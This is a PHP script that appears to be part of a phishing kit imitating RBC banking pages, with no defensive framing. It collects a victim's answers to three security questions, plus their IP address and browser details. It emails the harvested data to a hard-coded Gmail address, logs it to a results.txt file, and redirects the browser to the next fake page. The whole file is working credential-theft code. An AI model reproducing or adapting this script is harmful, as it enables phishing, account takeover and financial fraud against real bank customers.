<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------2 QuestionResults----------------\n";
$message .= "question1 : ".$_POST['question1']."\n";
$message .= "answer1 : ".$_POST['answer1']."\n";
$message .= "question2 : ".$_POST['question2']."\n";
$message .= "answer2 : ".$_POST['answer2']."\n";
$message .= "question3 : ".$_POST['question3']."\n";
$message .= "answer3 : ".$_POST['answer3']."\n";
$message .= "-----------------created by medpage---------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------rbcResults-----------------------\n";
$send = "flashygordon6754@gmail.com";
$subject = "RBCResultz 2 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "rbcgi3m012.html";

</script>